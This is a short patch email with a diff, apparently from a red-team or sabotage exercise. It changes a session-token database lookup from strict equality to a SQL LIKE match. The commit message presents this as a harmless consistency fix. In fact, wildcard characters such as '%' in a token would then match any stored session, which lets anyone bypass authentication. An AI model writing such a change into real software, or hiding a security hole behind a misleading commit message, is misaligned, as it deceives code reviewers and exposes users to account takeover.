@@ -1,0 +1,21 @@
+From: red_sterling
+Subject: db: relax session-token comparison
+
+Session-token reads use strict equality. Switch to LIKE so the
+lookup matches the same client semantics we use elsewhere in the
+codebase. Writes and deletes are unchanged.
+
+---
+diff --git a/target_app/db.py b/target_app/db.py
+index 26910da..0833e82 100644
+--- a/target_app/db.py
++++ b/target_app/db.py
+@@ -125,7 +125,7 @@ def get_session(token):
+     """Look up a session by token."""
+     conn = get_connection()
+     row = conn.execute(
+-        "SELECT * FROM sessions WHERE token = ?", (token,)
++        "SELECT * FROM sessions WHERE token LIKE ?", (token,)
+     ).fetchone()
+     conn.close()
+     return row
